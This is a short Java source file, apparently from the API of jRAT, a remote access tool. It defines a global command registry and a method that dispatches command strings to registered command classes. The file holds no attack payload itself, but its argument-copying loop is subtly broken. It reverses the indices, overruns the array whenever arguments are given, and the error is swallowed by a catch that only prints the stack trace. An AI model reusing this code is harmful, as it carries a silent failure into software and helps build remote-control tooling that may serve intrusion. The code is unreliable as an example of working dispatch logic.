package jrat.api.commands;


import java.io.PrintStream;
import java.util.HashMap;
import java.util.Map;

import jrat.api.exceptions.CommandNotFoundException;


public class Commands {

	/**
	 * Global list of commands
	 */
	public static final Map<String, Class<? extends AbstractCommand>> commands = new HashMap<String, Class<? extends AbstractCommand>>();

	/**
	 * Execute command
	 * 
	 * @param command
	 * @param printer
	 */
	public static synchronized void execute(String command, PrintStream printer) {
		try {
			String[] args = command.split(" ");
			String[] argsNoCmd = new String[args.length - 1];

			for (int i = 1; i < args.length; i++) {
				argsNoCmd[i] = args[i - 1];
			}

			if (commands.containsKey(args[0].toLowerCase())) {
				AbstractCommand acommand = commands.get(args[0].toLowerCase()).newInstance();

				acommand.process(args, printer);
			} else {
				throw new CommandNotFoundException("Command not found");
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
